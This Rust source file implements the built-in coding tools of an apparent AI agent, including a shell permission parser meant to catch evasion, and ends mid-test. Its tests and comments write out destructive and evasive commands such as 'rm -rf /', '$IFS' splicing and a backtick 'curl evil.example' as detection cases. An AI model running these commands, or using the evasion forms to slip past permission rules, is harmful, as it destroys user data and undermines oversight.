//! `flux-tools` — the built-in coding tools (`read`, `write`, `edit`, `bash`).
//!
//! Each implements [`flux_runtime::Tool`]: it declares its permission subjects (so rules and
//! approval can gate it), its [`ToolSpec`] (effects/risk), and its pre-execution [`IntentSet`],
//! and performs all IO through the guarded [`System`](flux_system::System). `bash` runs commands
//! via `sh -c` (an explicit, gated shell — `flux-system` itself never interprets argv as shell).

use std::time::Duration;

use async_trait::async_trait;
use serde_json::{json, Value};

use flux_core::{Error, Result};
use flux_policy::wildcard_match;
use flux_runtime::{Tool, ToolContext, ToolRegistry, ToolResult};
use flux_spec::{
    AccessKind, Effect, Idempotency, Intent, IntentBehavior, IntentCertainty, IntentRole,
    IntentSet, IntentTarget, Risk, ToolSpec,
};
use std::sync::Arc;

const DEFAULT_BASH_TIMEOUT_SECS: u64 = 120;
/// Upper bound on files visited by `glob`/`grep` before stopping (cost guard).
const WALK_FILE_CAP: usize = 10_000;
const DEFAULT_GLOB_LIMIT: usize = 1000;
const DEFAULT_GREP_LIMIT: usize = 200;

/// A single read-target intent for a path (used by the read-only `glob`/`grep` tools).
fn read_intent(path: &str) -> IntentSet {
    let mut set = IntentSet::new();
    set.push(Intent {
        behavior: IntentBehavior::FilesystemRead,
        target: IntentTarget::Path {
            path: path.to_string(),
        },
        role: IntentRole::ReadTarget,
        certainty: IntentCertainty::Certain,
    });
    set
}

fn str_param<'a>(params: &'a Value, key: &str, tool: &str) -> Result<&'a str> {
    params
        .get(key)
        .and_then(|v| v.as_str())
        .ok_or_else(|| Error::Other(format!("{tool}: required string param `{key}` missing")))
}

/// Register all built-in tools into a registry.
pub fn register_builtins(registry: &mut ToolRegistry) {
    registry.register(Arc::new(ReadTool));
    registry.register(Arc::new(WriteTool));
    registry.register(Arc::new(EditTool));
    registry.register(Arc::new(BashTool));
    registry.register(Arc::new(GlobTool));
    registry.register(Arc::new(GrepTool));
}

// ---------------------------------------------------------------------------
// read
// ---------------------------------------------------------------------------

pub struct ReadTool;

#[async_trait]
impl Tool for ReadTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec::read_only(
            "read",
            "Read a UTF-8 file from the workspace. Optional `offset`/`limit` select a line range.",
            json!({
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Workspace-relative path"},
                    "offset": {"type": "integer", "description": "0-based first line"},
                    "limit": {"type": "integer", "description": "Max lines to return"}
                },
                "required": ["path"]
            }),
        )
        .with_access(vec![AccessKind::Filesystem])
    }

    fn permission_subjects(&self, params: &Value) -> Vec<String> {
        params
            .get("path")
            .and_then(|v| v.as_str())
            .map(|s| vec![s.to_string()])
            .unwrap_or_default()
    }

    fn intents(&self, params: &Value) -> IntentSet {
        let mut set = IntentSet::new();
        if let Some(p) = params.get("path").and_then(|v| v.as_str()) {
            set.push(Intent {
                behavior: IntentBehavior::FilesystemRead,
                target: IntentTarget::Path {
                    path: p.to_string(),
                },
                role: IntentRole::ReadTarget,
                certainty: IntentCertainty::Certain,
            });
        }
        set
    }

    async fn execute(&self, ctx: &ToolContext, params: Value) -> Result<ToolResult> {
        let path = str_param(&params, "path", "read")?;
        let content = ctx.system.read_file(path).await?;
        let offset = params.get("offset").and_then(|v| v.as_u64()).unwrap_or(0) as usize;
        let limit = params
            .get("limit")
            .and_then(|v| v.as_u64())
            .map(|n| n as usize);
        if offset == 0 && limit.is_none() {
            return Ok(ToolResult::ok(content));
        }
        let lines: Vec<&str> = content.lines().collect();
        // `saturating_add` — attacker-supplied offset/limit can otherwise overflow usize and panic.
        let end = match limit {
            Some(l) => offset.saturating_add(l).min(lines.len()),
            None => lines.len(),
        };
        let start = offset.min(lines.len());
        Ok(ToolResult::ok(lines[start..end].join("\n")))
    }
}

// ---------------------------------------------------------------------------
// write
// ---------------------------------------------------------------------------

pub struct WriteTool;

#[async_trait]
impl Tool for WriteTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "write".into(),
            description: "Write (create/overwrite) a UTF-8 file in the workspace.".into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "path": {"type": "string"},
                    "content": {"type": "string"}
                },
                "required": ["path", "content"]
            }),
            output_schema: None,
            effects: vec![Effect::Write, Effect::Filesystem],
            risk: Risk::Medium,
            idempotency: Idempotency::Idempotent,
            access: vec![AccessKind::Filesystem],
        }
    }

    fn permission_subjects(&self, params: &Value) -> Vec<String> {
        params
            .get("path")
            .and_then(|v| v.as_str())
            .map(|s| vec![s.to_string()])
            .unwrap_or_default()
    }

    fn intents(&self, params: &Value) -> IntentSet {
        let mut set = IntentSet::new();
        if let Some(p) = params.get("path").and_then(|v| v.as_str()) {
            set.push(Intent {
                behavior: IntentBehavior::FilesystemWrite,
                target: IntentTarget::Path {
                    path: p.to_string(),
                },
                role: IntentRole::WriteTarget,
                certainty: IntentCertainty::Certain,
            });
        }
        set
    }

    async fn execute(&self, ctx: &ToolContext, params: Value) -> Result<ToolResult> {
        let path = str_param(&params, "path", "write")?;
        let content = str_param(&params, "content", "write")?;
        ctx.system.write_file(path, content).await?;
        Ok(ToolResult::ok(format!(
            "wrote {} bytes to {path}",
            content.len()
        )))
    }
}

// ---------------------------------------------------------------------------
// edit
// ---------------------------------------------------------------------------

pub struct EditTool;

#[async_trait]
impl Tool for EditTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "edit".into(),
            description: "Replace a string in a workspace file. `old_string` must occur exactly \
                          once (or set `replace_all` to replace every occurrence). If the exact \
                          text isn't found, a whitespace-tolerant line match is tried before \
                          failing, so trailing-whitespace differences don't block the edit."
                .into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "path": {"type": "string"},
                    "old_string": {"type": "string"},
                    "new_string": {"type": "string"},
                    "replace_all": {"type": "boolean"}
                },
                "required": ["path", "old_string", "new_string"]
            }),
            output_schema: None,
            effects: vec![Effect::Write, Effect::Filesystem],
            risk: Risk::Medium,
            idempotency: Idempotency::NonIdempotent,
            access: vec![AccessKind::Filesystem],
        }
    }

    fn permission_subjects(&self, params: &Value) -> Vec<String> {
        params
            .get("path")
            .and_then(|v| v.as_str())
            .map(|s| vec![s.to_string()])
            .unwrap_or_default()
    }

    fn intents(&self, params: &Value) -> IntentSet {
        let mut set = IntentSet::new();
        if let Some(p) = params.get("path").and_then(|v| v.as_str()) {
            set.push(Intent {
                behavior: IntentBehavior::FilesystemWrite,
                target: IntentTarget::Path {
                    path: p.to_string(),
                },
                role: IntentRole::WriteTarget,
                certainty: IntentCertainty::Certain,
            });
        }
        set
    }

    async fn execute(&self, ctx: &ToolContext, params: Value) -> Result<ToolResult> {
        let path = str_param(&params, "path", "edit")?;
        let old = str_param(&params, "old_string", "edit")?;
        let new = str_param(&params, "new_string", "edit")?;
        let replace_all = params
            .get("replace_all")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        let content = ctx.system.read_file(path).await?;
        let count = content.matches(old).count();

        if count == 0 {
            // Exact match failed — the usual cause is a trailing-whitespace or final-newline
            // mismatch. Try a whitespace-tolerant, line-aligned match before giving up, so the
            // model doesn't burn a turn re-guessing the exact bytes.
            return match flexible_edit(&content, old, new) {
                FlexMatch::One(updated) => {
                    ctx.system.write_file(path, &updated).await?;
                    Ok(ToolResult::ok(format!(
                        "edited {path} (matched `old_string` ignoring trailing whitespace)"
                    )))
                }
                FlexMatch::Many(n) => Err(Error::Other(format!(
                    "edit: `old_string` not found exactly in {path}, and a whitespace-insensitive \
                     match is ambiguous ({n} candidates); add surrounding lines for context"
                ))),
                FlexMatch::None => Err(Error::Other(format!(
                    "edit: `old_string` not found in {path}{}",
                    not_found_hint(&content, old)
                ))),
            };
        }
        if count > 1 && !replace_all {
            return Err(Error::Other(format!(
                "edit: `old_string` occurs {count} times in {path} (lines {}); pass replace_all or \
                 add surrounding context to make it unique",
                occurrence_lines(&content, old)
            )));
        }
        let updated = if replace_all {
            content.replace(old, new)
        } else {
            content.replacen(old, new, 1)
        };
        ctx.system.write_file(path, &updated).await?;
        Ok(ToolResult::ok(format!(
            "edited {path} ({} replacement{})",
            if replace_all { count } else { 1 },
            if replace_all && count != 1 { "s" } else { "" }
        )))
    }
}

/// Outcome of a whitespace-tolerant, line-aligned match (tried only when an exact match fails).
enum FlexMatch {
    /// Exactly one match; carries the rewritten file content.
    One(String),
    /// Multiple candidate matches (ambiguous — refuse rather than guess).
    Many(usize),
    /// No match.
    None,
}

/// Locate `old` in `content` allowing only **trailing-whitespace / final-newline** differences
/// (leading whitespace/indentation must still match exactly), at line granularity. Returns the
/// rewritten content when exactly one block matches — the common "trailing space the model didn't
/// reproduce" case, without the false-match risk of fuzzy matching.
fn flexible_edit(content: &str, old: &str, new: &str) -> FlexMatch {
    let cl: Vec<&str> = content.split_inclusive('\n').collect();
    let ol: Vec<&str> = old.split_inclusive('\n').collect();
    if ol.is_empty() || ol.len() > cl.len() {
        return FlexMatch::None;
    }
    let same = |a: &str, b: &str| a.trim_end() == b.trim_end();
    let hits: Vec<usize> = (0..=cl.len() - ol.len())
        .filter(|&i| (0..ol.len()).all(|j| same(cl[i + j], ol[j])))
        .collect();
    match hits.as_slice() {
        [] => FlexMatch::None,
        [i] => {
            let start: usize = cl[..*i].iter().map(|s| s.len()).sum();
            let end: usize = start + cl[*i..*i + ol.len()].iter().map(|s| s.len()).sum::<usize>();
            let matched = &content[start..end];
            // Match the file's line endings: the trim_end()-based compare strips `\r`, so an LF
            // `old_string` matches a CRLF block — emit `new` as CRLF too, or we'd leave mixed endings.
            let crlf = matched.contains("\r\n");
            let mut replacement = if crlf {
                new.replace("\r\n", "\n").replace('\n', "\r\n")
            } else {
                new.to_string()
            };
            // Keep a trailing newline the matched block had, so we don't merge the next line.
            if matched.ends_with('\n') && !replacement.ends_with('\n') {
                replacement.push_str(if crlf { "\r\n" } else { "\n" });
            }
            FlexMatch::One(format!(
                "{}{replacement}{}",
                &content[..start],
                &content[end..]
            ))
        }
        many => FlexMatch::Many(many.len()),
    }
}

/// Hint for a failed exact match: flag when a line with the same text exists but indented
/// differently (the agent should match the exact leading whitespace).
fn not_found_hint(content: &str, old: &str) -> String {
    let first = old.lines().next().unwrap_or("").trim();
    if !first.is_empty() && content.lines().any(|l| l.trim() == first) {
        " (a line with matching text exists but the indentation differs — match the exact leading \
         whitespace)"
            .to_string()
    } else {
        String::new()
    }
}

/// 1-based line numbers where `old` begins in `content` (capped at 10), for the not-unique error.
fn occurrence_lines(content: &str, old: &str) -> String {
    if old.is_empty() {
        return String::new();
    }
    let mut nums = Vec::new();
    let mut from = 0;
    while let Some(pos) = content[from..].find(old) {
        let abs = from + pos;
        nums.push((content[..abs].matches('\n').count() + 1).to_string());
        from = abs + old.len();
        if nums.len() >= 10 {
            break;
        }
    }
    nums.join(", ")
}

// ---------------------------------------------------------------------------
// bash
// ---------------------------------------------------------------------------

pub struct BashTool;

/// Parse a shell command into permission subjects (one per `&&`/`||`/`;`/`|`/newline segment),
/// shaped as `prog:args` (or bare `prog`) so rules like `Bash(git:*)` / `Bash(rm:*)` match.
///
/// Shell is Turing-complete, so this is **best-effort defense-in-depth**, not a sandbox (the real
/// boundary is the argv-only exec + the policy floor + destructive-intent escalation, which sees the
/// whole command). But it hardens the common evasions: leading `VAR=value` assignments are skipped
/// to find the real program, programs hidden inside `$(...)`/backtick substitutions are surfaced as
/// their own subjects (so a `Bash(rm:*)` deny still matches `echo $(rm -rf ~)`), and any command
/// using shell expansion we can't statically resolve gets a `<shell-expansion>` sentinel subject —
/// which no ordinary allow rule covers, so the call falls through to an approval prompt instead of
/// being silently authorized.
pub fn bash_subjects(command: &str) -> Vec<String> {
    let mut subjects = Vec::new();
    let mut obfuscated = false;

    // The top-level command plus any embedded command substitutions, so programs hidden inside
    // `$(...)`/backticks are surfaced too.
    let mut to_scan = vec![command.to_string()];
    let inner = extract_command_substitutions(command);
    if !inner.is_empty() {
        obfuscated = true;
        to_scan.extend(inner);
    }

    for cmd in &to_scan {
        for seg in cmd.split(['&', '|', ';', '\n']) {
            let seg = seg.trim();
            if seg.is_empty() {
                continue;
            }
            let mut toks = seg.split_whitespace().peekable();
            // Skip leading `VAR=value` environment assignments to find the real program.
            while toks.peek().is_some_and(|t| is_env_assignment(t)) {
                toks.next();
            }
            let Some(prog) = toks.next() else { continue };
            // A shell-expanded program name (`$IFS`, `${x}`, `` `…` ``) can't be matched reliably.
            if prog.contains('$') || prog.contains('`') {
                obfuscated = true;
            }
            let rest: Vec<&str> = toks.collect();
            if rest.is_empty() {
                subjects.push(prog.to_string());
            } else {
                subjects.push(format!("{prog}:{}", rest.join(" ")));
            }
        }
    }

    if subjects.is_empty() {
        subjects.push(command.trim().to_string());
    }
    if obfuscated {
        subjects.push("<shell-expansion>".to_string());
    }
    subjects
}

/// Whether `tok` is a leading `NAME=value` environment assignment (so it can be skipped to find the
/// real program in `X=1 rm -rf /`).
fn is_env_assignment(tok: &str) -> bool {
    match tok.split_once('=') {
        Some((name, _)) => {
            !name.is_empty()
                && name
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        }
        None => false,
    }
}

/// Extract the inner command strings of `$(...)` and `` `...` `` substitutions (one level), so a
/// program hidden inside one can still be surfaced as a permission subject.
fn extract_command_substitutions(command: &str) -> Vec<String> {
    let chars: Vec<char> = command.chars().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '$' && chars.get(i + 1) == Some(&'(') {
            let mut depth = 1;
            let start = i + 2;
            let mut j = start;
            while j < chars.len() && depth > 0 {
                match chars[j] {
                    '(' => depth += 1,
                    ')' => depth -= 1,
                    _ => {}
                }
                if depth == 0 {
                    break;
                }
                j += 1;
            }
            if depth == 0 {
                out.push(chars[start..j].iter().collect());
                i = j + 1;
                continue;
            }
        } else if chars[i] == '`' {
            if let Some(close) = (i + 1..chars.len()).find(|&k| chars[k] == '`') {
                out.push(chars[i + 1..close].iter().collect());
                i = close + 1;
                continue;
            }
        }
        i += 1;
    }
    out
}

#[async_trait]
impl Tool for BashTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "bash".into(),
            description: "Run a shell command (via `sh -c`) in the workspace root. Gated by \
                          permission rules and approval."
                .into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "command": {"type": "string"},
                    "timeout_secs": {"type": "integer"}
                },
                "required": ["command"]
            }),
            output_schema: None,
            effects: vec![Effect::Process, Effect::LocalSystem],
            risk: Risk::High,
            idempotency: Idempotency::NonIdempotent,
            access: vec![AccessKind::Process, AccessKind::LocalSystem],
        }
    }

    fn permission_subjects(&self, params: &Value) -> Vec<String> {
        params
            .get("command")
            .and_then(|v| v.as_str())
            .map(bash_subjects)
            .unwrap_or_default()
    }

    fn intents(&self, params: &Value) -> IntentSet {
        let mut set = IntentSet::new();
        if let Some(c) = params.get("command").and_then(|v| v.as_str()) {
            set.push(Intent {
                behavior: IntentBehavior::CommandExecution,
                target: IntentTarget::Process {
                    command: c.to_string(),
                },
                role: IntentRole::ProcessCommand,
                certainty: IntentCertainty::Certain,
            });
        }
        set
    }

    async fn execute(&self, ctx: &ToolContext, params: Value) -> Result<ToolResult> {
        let command = str_param(&params, "command", "bash")?;
        let timeout = params
            .get("timeout_secs")
            .and_then(|v| v.as_u64())
            .unwrap_or(DEFAULT_BASH_TIMEOUT_SECS);
        let argv = vec!["sh".to_string(), "-c".to_string(), command.to_string()];
        let out = ctx.system.run(&argv, Duration::from_secs(timeout)).await?;
        let mut body = String::new();
        if !out.stdout.is_empty() {
            body.push_str(&out.stdout);
        }
        if !out.stderr.is_empty() {
            if !body.is_empty() {
                body.push('\n');
            }
            body.push_str(&out.stderr);
        }
        if out.exit_code != 0 {
            body.push_str(&format!("\n[exit {}]", out.exit_code));
        }
        Ok(ToolResult {
            content: body,
            is_error: out.exit_code != 0,
        })
    }
}

// ---------------------------------------------------------------------------
// glob
// ---------------------------------------------------------------------------

pub struct GlobTool;

#[async_trait]
impl Tool for GlobTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec::read_only(
            "glob",
            "List workspace files matching a glob pattern. `*` matches any characters (including \
             `/`), so `*.rs` finds all Rust files and `src/*` everything under src. Optional \
             `path` scopes the search to a subdirectory. Patterns match workspace-relative paths.",
            json!({
                "type": "object",
                "properties": {
                    "pattern": {"type": "string", "description": "Glob, e.g. `*.rs` or `src/*`"},
                    "path": {"type": "string", "description": "Subdirectory to search (default `.`)"}
                },
                "required": ["pattern"]
            }),
        )
        .with_effects(vec![Effect::Read, Effect::Filesystem])
        .with_access(vec![AccessKind::Filesystem])
    }

    fn permission_subjects(&self, params: &Value) -> Vec<String> {
        vec![params
            .get("path")
            .and_then(|v| v.as_str())
            .unwrap_or(".")
            .to_string()]
    }

    fn intents(&self, params: &Value) -> IntentSet {
        read_intent(params.get("path").and_then(|v| v.as_str()).unwrap_or("."))
    }

    async fn execute(&self, ctx: &ToolContext, params: Value) -> Result<ToolResult> {
        let pattern = str_param(&params, "pattern", "glob")?;
        let base = params.get("path").and_then(|v| v.as_str()).unwrap_or(".");
        let files = ctx.system.walk_files(base, WALK_FILE_CAP).await?;
        let mut matches: Vec<String> = files
            .into_iter()
            .filter(|f| wildcard_match(pattern, f))
            .collect();
        matches.truncate(DEFAULT_GLOB_LIMIT);
        if matches.is_empty() {
            return Ok(ToolResult::ok("no files match"));
        }
        Ok(ToolResult::ok(matches.join("\n")))
    }
}

// ---------------------------------------------------------------------------
// grep
// ---------------------------------------------------------------------------

pub struct GrepTool;

#[async_trait]
impl Tool for GrepTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec::read_only(
            "grep",
            "Search file contents for a literal substring across the workspace. Optional `glob` \
             restricts which files are searched (e.g. `*.rs`) and `path` scopes to a subdirectory. \
             Returns `path:line: text` for each match.",
            json!({
                "type": "object",
                "properties": {
                    "pattern": {"type": "string", "description": "Literal substring to find"},
                    "glob": {"type": "string", "description": "Only search files matching this glob"},
                    "path": {"type": "string", "description": "Subdirectory to search (default `.`)"},
                    "max_results": {"type": "integer", "description": "Cap on matches (default 200)"}
                },
                "required": ["pattern"]
            }),
        )
        .with_effects(vec![Effect::Read, Effect::Filesystem])
        .with_access(vec![AccessKind::Filesystem])
    }

    fn permission_subjects(&self, params: &Value) -> Vec<String> {
        vec![params
            .get("path")
            .and_then(|v| v.as_str())
            .unwrap_or(".")
            .to_string()]
    }

    fn intents(&self, params: &Value) -> IntentSet {
        read_intent(params.get("path").and_then(|v| v.as_str()).unwrap_or("."))
    }

    async fn execute(&self, ctx: &ToolContext, params: Value) -> Result<ToolResult> {
        let pattern = str_param(&params, "pattern", "grep")?;
        let base = params.get("path").and_then(|v| v.as_str()).unwrap_or(".");
        let glob = params.get("glob").and_then(|v| v.as_str());
        let max = params
            .get("max_results")
            .and_then(|v| v.as_u64())
            .map(|n| n as usize)
            .unwrap_or(DEFAULT_GREP_LIMIT);

        let files = ctx.system.walk_files(base, WALK_FILE_CAP).await?;
        let mut out = Vec::new();
        'files: for f in files {
            if let Some(g) = glob {
                if !wildcard_match(g, &f) {
                    continue;
                }
            }
            // Best-effort: skip binary/non-UTF-8/unreadable files rather than failing the search.
            let Ok(content) = ctx.system.read_file(&f).await else {
                continue;
            };
            for (i, line) in content.lines().enumerate() {
                if line.contains(pattern) {
                    let shown: String = if line.chars().count() > 200 {
                        let head: String = line.chars().take(200).collect();
                        format!("{head}…")
                    } else {
                        line.trim_end().to_string()
                    };
                    out.push(format!("{f}:{}: {shown}", i + 1));
                    if out.len() >= max {
                        break 'files;
                    }
                }
            }
        }
        if out.is_empty() {
            return Ok(ToolResult::ok("no matches"));
        }
        Ok(ToolResult::ok(out.join("\n")))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use flux_system::{System, Workspace};
    use std::sync::atomic::{AtomicU64, Ordering};

    static COUNTER: AtomicU64 = AtomicU64::new(0);

    fn ctx() -> (std::path::PathBuf, ToolContext) {
        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
        let dir = std::env::temp_dir().join(format!("flux-tools-test-{}-{n}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let c = ToolContext::new(Arc::new(System::new(Workspace::new(&dir).unwrap())));
        (dir, c)
    }

    #[tokio::test]
    async fn edit_tolerates_trailing_whitespace() {
        let (dir, c) = ctx();
        // The file's first line has trailing spaces the model won't reproduce in `old_string`.
        WriteTool
            .execute(
                &c,
                json!({"path": "a.rs", "content": "fn main() {   \n    let x = 1;\n}\n"}),
            )
            .await
            .unwrap();
        let r = EditTool
            .execute(
                &c,
                json!({
                    "path": "a.rs",
                    "old_string": "fn main() {\n    let x = 1;",
                    "new_string": "fn main() {\n    let x = 2;"
                }),
            )
            .await
            .unwrap();
        assert!(!r.is_error, "flexible edit should succeed: {}", r.content);
        let after = ReadTool.execute(&c, json!({"path": "a.rs"})).await.unwrap();
        assert!(after.content.contains("let x = 2;"));
        assert!(after.content.ends_with("}\n"), "structure preserved");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn grep_searches_a_single_file_path() {
        // Regression (dogfood F1): grep/glob scoped to a *file* path used to return "no matches"
        // because the underlying walk only ever `read_dir`'d the base (which errors on a file). A
        // file `path` must search that file.
        let (dir, c) = ctx();
        WriteTool
            .execute(&c, json!({"path": "a.rs", "content": "fn needle() {}\n"}))
            .await
            .unwrap();
        WriteTool
            .execute(&c, json!({"path": "b.rs", "content": "fn other() {}\n"}))
            .await
            .unwrap();
        // Scoped to the single file a.rs → must find the match.
        let hit = GrepTool
            .execute(&c, json!({"pattern": "needle", "path": "a.rs"}))
            .await
            .unwrap();
        assert!(!hit.is_error);
        assert!(
            hit.content.contains("a.rs:1:") && hit.content.contains("needle"),
            "grep on a file path must find the match, got: {:?}",
            hit.content
        );
        // A file path that lacks the pattern → a genuine "no matches" (not a false negative).
        let none = GrepTool
            .execute(&c, json!({"pattern": "needle", "path": "b.rs"}))
            .await
            .unwrap();
        assert_eq!(none.content, "no matches");
        // glob scoped to a single file lists exactly that file.
        let g = GlobTool
            .execute(&c, json!({"pattern": "*", "path": "a.rs"}))
            .await
            .unwrap();
        assert_eq!(g.content.trim(), "a.rs");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn edit_preserves_crlf_line_endings() {
        let (dir, c) = ctx();
        WriteTool
            .execute(
                &c,
                json!({"path": "a.rs", "content": "fn main() {\r\n    let x = 1;\r\n}\r\n"}),
            )
            .await
            .unwrap();
        // The model sends an LF old_string/new_string (it doesn't reproduce \r).
        EditTool
            .execute(
                &c,
                json!({
                    "path": "a.rs",
                    "old_string": "fn main() {\n    let x = 1;",
                    "new_string": "fn main() {\n    let y = 9;"
                }),
            )
            .await
            .unwrap();
        let after = ReadTool.execute(&c, json!({"path": "a.rs"})).await.unwrap();
        assert!(after.content.contains("let y = 9;"));
        // Every newline is still part of a CRLF — no bare LF introduced into the CRLF file.
        assert_eq!(
            after.content.matches('\n').count(),
            after.content.matches("\r\n").count(),
            "edit must not introduce bare LFs into a CRLF file: {:?}",
            after.content
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn edit_reports_occurrence_lines_when_ambiguous() {
        let (dir, c) = ctx();
        WriteTool
            .execute(&c, json!({"path": "a.txt", "content": "x\nfoo\ny\nfoo\n"}))
            .await
            .unwrap();
        let err = EditTool
            .execute(
                &c,
                json!({"path": "a.txt", "old_string": "foo", "new_string": "bar"}),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("lines 2, 4"), "got: {err}");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn edit_hints_on_indentation_mismatch() {
        let (dir, c) = ctx();
        // File is tab-indented; the model's old_string uses spaces — so it's neither an exact
        // substring nor a flexible (trailing-ws-only) match, but the text is clearly present.
        WriteTool
            .execute(&c, json!({"path": "a.txt", "content": "\tindented line\n"}))
            .await
            .unwrap();
        let err = EditTool
            .execute(
                &c,
                json!({"path": "a.txt", "old_string": "    indented line", "new_string": "x"}),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("indentation differs"), "got: {err}");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn read_with_overflowing_offset_limit_does_not_panic() {
        let (dir, c) = ctx();
        WriteTool
            .execute(&c, json!({"path": "a.txt", "content": "l1\nl2\nl3\n"}))
            .await
            .unwrap();
        // Attacker-supplied offset/limit near usize::MAX must not overflow-panic.
        let r = ReadTool
            .execute(
                &c,
                json!({"path": "a.txt", "offset": u64::MAX, "limit": u64::MAX}),
            )
            .await
            .unwrap();
        assert!(!r.is_error);
        assert!(r.content.is_empty(), "offset past EOF yields no lines");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn write_read_edit_roundtrip() {
        let (dir, c) = ctx();
        WriteTool
            .execute(&c, json!({"path": "a.txt", "content": "line1\nline2\n"}))
            .await
            .unwrap();
        let r = ReadTool
            .execute(&c, json!({"path": "a.txt"}))
            .await
            .unwrap();
        assert_eq!(r.content, "line1\nline2\n");

        EditTool
            .execute(
                &c,
                json!({"path": "a.txt", "old_string": "line2", "new_string": "LINE2"}),
            )
            .await
            .unwrap();
        let r = ReadTool
            .execute(&c, json!({"path": "a.txt"}))
            .await
            .unwrap();
        assert!(r.content.contains("LINE2"));
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn read_offset_limit() {
        let (dir, c) = ctx();
        WriteTool
            .execute(&c, json!({"path": "n.txt", "content": "a\nb\nc\nd"}))
            .await
            .unwrap();
        let r = ReadTool
            .execute(&c, json!({"path": "n.txt", "offset": 1, "limit": 2}))
            .await
            .unwrap();
        assert_eq!(r.content, "b\nc");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn edit_requires_unique_match() {
        let (dir, c) = ctx();
        WriteTool
            .execute(&c, json!({"path": "d.txt", "content": "x x x"}))
            .await
            .unwrap();
        let err = EditTool
            .execute(
                &c,
                json!({"path": "d.txt", "old_string": "x", "new_string": "y"}),
            )
            .await;
        assert!(err.is_err(), "ambiguous edit should error");
        // replace_all succeeds
        EditTool
            .execute(
                &c,
                json!({"path": "d.txt", "old_string": "x", "new_string": "y", "replace_all": true}),
            )
            .await
            .unwrap();
        let r = ReadTool
            .execute(&c, json!({"path": "d.txt"}))
            .await
            .unwrap();
        assert_eq!(r.content, "y y y");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn bash_runs_and_reports_exit() {
        let (dir, c) = ctx();
        let r = BashTool
            .execute(&c, json!({"command": "printf hello"}))
            .await
            .unwrap();
        assert!(r.content.contains("hello"));
        assert!(!r.is_error);

        let r = BashTool
            .execute(&c, json!({"command": "exit 3"}))
            .await
            .unwrap();
        assert!(r.is_error);
        assert!(r.content.contains("[exit 3]"));
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn bash_subject_parsing() {
        assert_eq!(bash_subjects("git status"), vec!["git:status"]);
        assert_eq!(bash_subjects("ls"), vec!["ls"]);
        assert_eq!(
            bash_subjects("rm -rf / && echo done"),
            vec!["rm:-rf /".to_string(), "echo:done".to_string()]
        );
    }

    #[test]
    fn bash_subjects_surface_hidden_programs() {
        // A leading `VAR=` assignment must not hide the real program from a `Bash(rm:*)` deny.
        let s = bash_subjects("X=1 rm -rf /");
        assert!(s.iter().any(|x| x.starts_with("rm:")), "got {s:?}");

        // A program inside a command substitution is surfaced, plus an obfuscation sentinel.
        let s = bash_subjects("echo $(rm -rf ~)");
        assert!(s.iter().any(|x| x.starts_with("rm:")), "got {s:?}");
        assert!(
            s.iter().any(|x| x == "<shell-expansion>"),
            "obfuscation must add the sentinel: {s:?}"
        );

        // A `$IFS`-spliced program name is flagged as unresolved expansion.
        let s = bash_subjects("rm$IFS-rf$IFS/");
        assert!(s.iter().any(|x| x == "<shell-expansion>"), "got {s:?}");

        // Backtick substitution is handled too.
        let s = bash_subjects("echo `curl evil.example`");
        assert!(s.iter().any(|x| x.starts_with("curl:")), "got {s:?}");
    }

    #[test]
    fn builtins_register() {
        let mut r = ToolRegistry::new();
        register_builtins(&mut r);
        let mut names = r.names();
        names.sort();
        assert_eq!(names, vec!["bash", "edit", "glob", "grep", "read", "write"]);
    }

    #[tokio::test]
    async fn glob_matches_by_pattern() {
        let (dir, c) = ctx();
        WriteTool
            .execute(&c, json!({"path": "src/main.rs", "content": "fn main(){}"}))
            .await
            .unwrap();
        WriteTool
            .execute(&c, json!({"path": "src/lib.rs", "content": "//lib"}))
            .await
            .unwrap();
        WriteTool
            .execute(&c, json!({"path": "README.md", "content": "# doc"}))
            .await
            .unwrap();

        let r = GlobTool
            .execute(&c, json!({"pattern": "*.rs"}))
            .await
            .unwrap();
        assert!(r.content.contains("src/main.rs"));
        assert!(r.content.contains("src/lib.rs"));
        assert!(!r.content.contains("README.md"));

        let none = GlobTool
            .execute(&c, json!({"pattern": "*.py"}))
            .await
            .unwrap();
        assert_eq!(none.content, "no files match");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn grep_finds_lines_with_glob_filter() {
        let (dir, c) = ctx();
        WriteTool
            .execute(
                &c,
                json!({"path": "src/a.rs", "content": "let x = 1;\nfn target() {}\n"}),
            )
            .await
            .unwrap();
        WriteTool
            .execute(
                &c,
                json!({"path": "notes.txt", "content": "target in text\n"}),
            )
            .await
            .unwrap();

        // restricted to *.rs → only the rust hit
        let r = GrepTool
            .execute(&c, json!({"pattern": "target", "glob": "*.rs"}))
            .await
            .unwrap();
        assert!(r.content.contains("src/a.rs:2:"));
        assert!(!r.content.contains("notes.txt"));

        // unrestricted → both
        let all = GrepTool
